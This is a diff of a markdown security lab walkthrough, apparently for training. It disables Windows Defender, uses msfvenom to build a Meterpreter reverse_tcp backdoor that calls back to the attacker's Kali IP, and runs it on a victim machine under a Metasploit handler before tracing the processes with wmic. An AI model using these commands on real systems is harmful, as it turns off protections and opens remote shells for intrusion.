@@ -9,11 +9,15 @@ Open a Terminal as Administrator and select "Yes" at UAC prompt.
 In the default PowerShell window, run the following command to disable Defender. 
 Remember, our goal here is not bypass endpoint protection.
 
-`Set-MpPreference -DisableRealtimeMonitoring $true`
+```PS
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 
 Check if Defender is really turned off with (should be False):
 
-`Get-MpComputerStatus | select RealTimeProtectionEnabled`
+```PS
+Get-MpComputerStatus | select RealTimeProtectionEnabled
+```
 
 ### Step 2
 
@@ -37,16 +41,27 @@ Mark the IP address of the Kali Linux machine eth0 interface. Your IP will be DI
 
 Run the following command to create a simple backdoor.
 
-`sudo su -`
+```bash
+sudo su -
+```
 
-`msfvenom --platform Windows -a x86 -p windows/meterpreter/reverse_tcp lhost=<YOUR ETH0 IP> lport=4444 -f exe -o /tmp/beliveme.exe`
+```bash
+msfvenom --platform Windows -a x86 -p windows/meterpreter/reverse_tcp lhost=<YOUR ETH0 IP> lport=4444 -f exe -o /tmp/beliveme.exe
+```
 
-`ls -l /tmp/beliveme.exe`
+```bash
+ls -l /tmp/beliveme.exe
+```
 
 Copy the malware to the share folder accessible by the Victim machine
-`cp /tmp/beliveme.exe /mnt/c/temp`
 
-`ls -l /mnt/c/temp/`
+```bash
+cp /tmp/beliveme.exe /mnt/c/temp
+```
+
+```bash
+ls -l /mnt/c/temp/
+```
 
 Now, we need to start the handler on attacker (Linux) machine. We need one more shell to the Linux box. Select the down carrot from the upper tabs on the Winodws Terminal and select kali-linux
 
@@ -54,7 +69,9 @@ Now, we need to start the handler on attacker (Linux) machine. We need one more 
 
 Become a root:
 
-`sudo su -`
+```bash
+sudo su -
+```
 
 Start the metasploit handler:
 
@@ -72,7 +89,9 @@ msf6 exploit(multi/handler) > `exploit`
 Open a Windows command prompt, by selecting the down carrot from the the Windows Terminal.
 Once it's opened, run these commands:
 
-`cd \temp`
+```bash
+cd \temp
+```
 
 `beliveme.exe`
 
@@ -154,13 +173,13 @@ We can also find the parent process ID.
 
 
 ```cmd
-wmic process get name,parentprocessid, processid | find "5496"
+wmic process get name,parentprocessid,processid | find "5496"
 ```
 
 ![](attachments/warmup_15.png)
 
 ```cmd
-wmic process get name,parentprocessid, processid | find "1256"
+wmic process get name,parentprocessid,processid | find "1256"
 ```
 
 ![](attachments/warmup_16.png)
